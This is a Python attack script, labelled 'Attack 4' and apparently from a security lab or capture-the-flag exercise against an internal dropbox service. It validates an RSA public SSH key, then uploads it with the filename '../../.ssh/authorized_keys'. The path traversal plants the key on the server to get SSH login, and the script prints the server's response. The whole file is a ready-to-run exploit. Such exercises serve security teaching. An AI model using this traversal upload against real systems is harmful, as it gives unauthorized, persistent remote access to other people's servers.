# The Python script for Attack 4

import requests
import argparse
import base64
import struct
import sys
import binascii
from bs4 import BeautifulSoup

def verify_ssh_key(ssh_key_path):
    try:
        key = open(ssh_key_path).read()
    except FileNotFoundError:
        return False
    array=key.split()
    # Each rsa-ssh key has 3 different strings in it, first one being
    # typeofkey second one being keystring third one being username .
    if len(array) != 3:
        return False

    typeofkey=array[0]
    string=array[1]
    username=array[2]
    # must have only valid rsa-ssh key characters ie binascii characters
    try:
        data=base64.b64decode(string)
    except base64.binascii.Error:
        return False

    a=4
    # unpack the contents of data, from data[:4] , it must be equal to 7 , property of ssh key .
    try:
        str_len = struct.unpack('>I', data[:a])[0]
    except struct.error:
        return False

    # data[4:11] must have string which matches with the typeofkey , another ssh key property.
    return data[a:a+str_len] == typeofkey.encode() and int(str_len) == int(7)



def main():
    parser = argparse.ArgumentParser(description='Process the path of SSH key.')
    parser.add_argument('Path', metavar='path', type=str, help='the path to a public SSH key')

    args = parser.parse_args()

    if not verify_ssh_key(args.Path):
        print("Invalid public SSH key")
        exit(1)


    # Now upload the file
    url = "https://dropbox.internal.regjeringen.uiaikt.no/"

    with open(args.Path, 'rb') as file:
        files = {'file': ('../../.ssh/authorized_keys',file)}
        response = requests.post(url, files=files)
        if response.status_code != 200:
            print(f"Failed to upload, website returned {response.status_code} status code")
            exit(1)

        # Parse the HTML response
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find elements that match '.card > p'
        elements = soup.select('.card > p')

        # Print the text of each matching element
        for element in elements:
            print(element.get_text())

if __name__ == "__main__":
    main()
